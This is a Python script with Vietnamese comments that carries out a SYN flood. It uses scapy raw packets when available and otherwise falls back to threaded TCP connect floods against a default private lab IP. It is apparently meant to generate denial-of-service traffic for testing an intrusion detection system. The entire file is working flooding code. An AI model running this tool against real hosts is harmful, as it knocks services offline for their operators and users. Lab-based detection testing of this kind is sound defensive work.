#!/usr/bin/env python3
"""
=============================================================================
Tên file   : syn_flood_fallback.py
Mục tiêu   : Fallback SYN Flood khi không có hping3.
             Dùng Python socket để gửi nhiều SYN connections nhanh.
Input      : TARGET IP, port, số lượng connections, duration.
Output     : TCP SYN traffic → IDPS phải phát hiện DoS/DDoS.
Ngày tạo   : 2026-06-06
Ngày sửa   : —
Lí do sửa  : —

LƯU Ý: Script này KHÔNG dùng raw socket (không cần root cho fallback mode).
        Thay vào đó, nó mở rất nhiều TCP connections nhanh → tạo SYN flood effect.
        Nếu có scapy, dùng scapy để gửi raw SYN packets.
=============================================================================
"""

import socket
import time
import random
import sys
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor

DEFAULT_TARGET = "172.16.1.2"
DEFAULT_PORT = 80
DEFAULT_DURATION = 30  # giây
DEFAULT_THREADS = 50


def log(msg: str):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


# ── Biến đếm thread-safe ──
_counter_lock = threading.Lock()
_total_sent = 0


def syn_connect(target: str, port: int):
    """Mở kết nối TCP nhanh rồi đóng ngay (tạo SYN → SYN-ACK → RST pattern)."""
    global _total_sent
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect_ex((target, port))  # Non-blocking connect
        s.close()
        with _counter_lock:
            _total_sent += 1
    except (OSError, socket.error):
        with _counter_lock:
            _total_sent += 1  # Vẫn đếm vì SYN packet đã gửi


def flood_worker(target: str, port: int, stop_event: threading.Event):
    """Worker thread: gửi SYN liên tục cho đến khi stop_event được set."""
    while not stop_event.is_set():
        syn_connect(target, port)
        # Không sleep → flood tối đa


def try_scapy_flood(target: str, port: int, duration: int) -> bool:
    """Thử dùng scapy nếu có (raw SYN packets, hiệu quả hơn)."""
    try:
        from scapy.all import IP, TCP, send, RandShort
        log("Phát hiện scapy. Dùng raw SYN flood (hiệu quả hơn).")

        packet = IP(dst=target) / TCP(dport=port, sport=RandShort(), flags="S")
        log(f"Gửi SYN flood trong {duration}s...")

        start = time.time()
        count = 0
        while time.time() - start < duration:
            send(packet, count=100, inter=0, verbose=0)
            count += 100
            if count % 1000 == 0:
                elapsed = int(time.time() - start)
                log(f"  Đã gửi {count} packets | {elapsed}s/{duration}s")

        log(f"Scapy SYN flood hoàn tất: {count} packets trong {duration}s")
        return True
    except ImportError:
        return False


def main():
    parser = argparse.ArgumentParser(description="SYN Flood Fallback for IDPS Testing")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target IP")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Target port")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION, help="Duration in seconds")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Number of threads")
    args = parser.parse_args()

    log(f"SYN Flood: {args.target}:{args.port}")
    log(f"Duration: {args.duration}s, Threads: {args.threads}")
    log("=" * 50)

    # Thử scapy trước (hiệu quả hơn)
    if try_scapy_flood(args.target, args.port, args.duration):
        return

    # Fallback: dùng thread pool với TCP connect
    log("Scapy không có. Dùng TCP connect flood (socket).")
    stop_event = threading.Event()

    # Khởi chạy threads
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=flood_worker, args=(args.target, args.port, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

    log(f"Đã khởi chạy {args.threads} threads. Flood trong {args.duration}s...")

    # Chờ hết duration
    start = time.time()
    while time.time() - start < args.duration:
        time.sleep(2)
        elapsed = int(time.time() - start)
        log(f"  Connections: {_total_sent} | {elapsed}s/{args.duration}s")

    # Dừng threads
    stop_event.set()
    for t in threads:
        t.join(timeout=2)

    log(f"SYN Flood hoàn tất: {_total_sent} connections trong {args.duration}s")


if __name__ == "__main__":
    main()
